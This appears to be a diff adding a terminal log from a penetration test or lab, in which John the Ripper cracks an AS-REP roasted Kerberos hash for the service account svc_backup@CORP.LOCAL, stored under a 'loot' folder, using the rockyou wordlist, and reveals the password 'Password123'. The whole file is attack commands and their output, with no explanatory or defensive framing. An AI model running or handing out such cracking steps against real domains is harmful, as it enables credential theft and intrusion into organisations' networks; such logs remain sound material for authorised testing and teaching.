@@ -1,0 +1,14 @@
+$ john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt loot/asrep_hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 2 OpenMP threads
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+Password123      ($krb5asrep$23$svc_backup@CORP.LOCAL)     
+1g 0:00:00:00 DONE (2026-10-19 09:19) 20.00g/s 675840p/s 675840c/s 675840C/s katten..redlips
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+$ john --format=krb5asrep --show loot/asrep_hash.txt
+$krb5asrep$23$svc_backup@CORP.LOCAL:Password123
+
+1 password hash cracked, 0 left
